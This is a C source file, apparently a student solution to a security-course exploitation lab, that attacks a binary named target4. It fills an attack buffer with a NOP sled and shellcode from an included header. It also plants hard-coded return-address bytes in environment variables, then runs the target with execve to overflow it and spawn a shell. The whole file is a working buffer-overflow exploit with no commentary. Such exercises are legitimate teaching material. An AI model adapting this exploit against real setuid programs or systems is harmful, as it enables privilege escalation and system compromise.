#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define TARGET_ADDR_0 0xa0
#define TARGET_ADDR_1 0xfd
#define TARGET_ADDR_2 0xa4
#define TARGET_ADDR_3 0x40
#define BUFSIZE 201 
#define ENVSIZE 12 
#define SHELLSIZE 45
#define NOPSIZE 32
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[6];
	char attackBuffer[BUFSIZE + 1];
	char env_i[2];
	char envBuffer[ENVSIZE+1];
	
	int i = 0;
	for (i = 0; i < BUFSIZE; i++){
		attackBuffer[i] = 0x90;
	}
	for (i = 0; i < SHELLSIZE; i++){
		attackBuffer[NOPSIZE + i] = shellcode[i];
	}
	for (i = 0; i < ENVSIZE; i++){
		if(i%4==0){
			envBuffer[i] = TARGET_ADDR_0;
		}else if(i%4==1){
			envBuffer[i] = TARGET_ADDR_1;
		}else if(i%4==2){
			envBuffer[i] = TARGET_ADDR_2;
		}else{
			envBuffer[i] = TARGET_ADDR_3;
		}
	}
	envBuffer[ENVSIZE] = '\0';

	env_i[0] = 0xd0;
	env_i[1] = '\0';

	attackBuffer[BUFSIZE-1] = 0xe0;
	attackBuffer[BUFSIZE] = '\0';

	args[0] = TARGET;
	args[1] = attackBuffer;
	args[2] = NULL;

	env[0] = "";
	env[1] = "";
	env[2] = env_i;
	env[3] = "";
	env[4] = "";
	env[5] = envBuffer;
	

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
